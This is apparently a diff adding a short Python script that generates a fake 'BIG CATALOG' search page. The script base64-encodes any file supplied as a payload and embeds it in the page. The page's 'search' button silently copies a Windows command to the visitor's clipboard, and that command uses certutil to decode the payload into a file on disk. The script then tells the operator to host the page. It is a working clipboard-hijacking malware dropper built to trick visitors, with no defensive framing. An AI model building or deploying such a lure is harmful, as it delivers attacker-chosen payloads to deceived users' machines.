@@ -1,0 +1,74 @@
+from sys import argv
+from base64 import b64encode
+website = '''
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body {{
+      margin: 100px;
+    }}
+    #textbox {{
+      width: 40vw;
+      height: 30vh;
+      position: absolute;
+      margin-left: 50px;
+      margin-top: 20px;
+    }}
+    button {{
+      width: 70px;
+      height: 40px;
+      margin-top: 120px;
+      margin-left: 50px;
+      background-color: green;
+      color: white;
+      border-radius: 10px;
+      box-shadow: grey;
+      position: absolute;
+    }}
+    #sample {{
+      width: 70vw;
+      margin: 50px;
+      background-color: green;
+      color: white;
+      padding: 20px;
+      font-size: x-large;
+      position: absolute;
+    }}
+    h1 {{
+      margin-left: 50px;
+      margin-top: 160px;
+    }}
+  </style>
+</head>
+<body>
+  <div id="sample">
+    BIG CATALOG
+  </div>
+  <br />
+  <button onclick="copyText()">search</button>
+  <br />
+  <h1>RESULTS:</h1><br />
+  <h2> error that rate was not found </h2>
+  <script>
+    function copyText() {{
+      /* Copy text into clipboard */
+      navigator.clipboard.writeText
+        ("echo {} > temp.temp; certutil.exe -decode temp.temp folder.zip");
+    }}
+  </script>
+</body>
+</html>
+'''
+with open(argv[-1],'rb') as f:
+  payload = f.read()
+b64 = b64encode(payload).decode()
+new_website = website.format(b64)
+with open('catalog.html','w') as f:
+  f.write(new_website)
+print('now host catalog.html')
+
+
+
+
+
